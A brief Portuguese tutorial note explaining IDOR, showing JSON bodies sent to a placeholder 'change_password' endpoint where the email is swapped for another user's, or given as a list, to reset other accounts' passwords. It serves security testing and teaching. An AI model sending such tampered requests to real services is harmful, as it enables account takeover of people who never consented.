IDOR é a possibilidade de um usuário alterar informações de outro usuário.

Devemos sempre está atentos as requisições, e o que elas mandam. Como `id` de usuário, `email`, `hashes` e etc ...

Digamos que algum ``backend`` faça a seguinte requisição para a ``api``.

<input style="font-size:18pt;padding:5px;width:100%;" value="http://corp.com/api/change_password">
```json
{
	"email":"nycolas@corp.com",
	"new_password":"nycolas"
}
```

Podemos alterar o email, e ver se há algum retorno do backend.
<input style="font-size:18pt;padding:5px;width:100%;" value="http://corp.com/api/change_password">
```json
{
	"email":"davi@corp.com",
	"new_password":"nycolas"
}
```

Ou até mesmo passar uma lista de usuários.
<input style="font-size:18pt;padding:5px;width:100%;" value="http://corp.com/api/change_password">
```json
{
	"email":[
		"nycolas@corp.com",
		"davi@corp.com"
	],
	"new_password":"nycolas"
}
```




